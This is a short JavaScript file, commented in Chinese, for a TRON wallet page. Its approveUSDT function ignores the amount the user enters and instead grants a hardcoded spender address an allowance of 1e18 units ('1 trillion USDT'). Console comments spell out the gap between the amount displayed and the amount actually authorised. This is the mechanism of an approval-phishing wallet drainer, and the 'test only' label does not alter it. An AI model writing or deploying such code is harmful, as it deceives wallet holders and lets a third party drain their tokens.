// usdtApprove.js — 只测试 1万亿 USDT

// ====== TRON 链配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";

// ====== 1万亿 USDT ======
function getOneTrillion() {
    return "1000000000000000000"; // 1e18 = 1万亿 USDT
}

window.approveUSDT = async function() {
  try {
    console.log("=== 测试 1万亿 USDT ===");
    setStatus("准备 1万亿 USDT 授权...");
    
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }

    const input = document.getElementById("amount");
    const inputAmount = parseFloat(input.value);

    // 🎯 只使用 1万亿 USDT
    const bigAmount = getOneTrillion();
    
    console.log("前端显示:", inputAmount, "USDT");
    console.log("实际授权: 1万亿 USDT");
    console.log("授权值:", bigAmount);

    setStatus(`准备授权...`);

    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
    
    setStatus("⚠️ 请检查钱包显示的授权金额...");
    
    const result = await usdtContract.approve(
      spenderAddress, 
      bigAmount
    ).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("✅ 交易成功:", result);
    setStatus(`✅ 1万亿 USDT 授权成功`);
    
  } catch (err) {
    console.error("授权失败:", err);
    setStatus("❌ 1万亿 USDT 失败: " + err.message, true);
  }
};
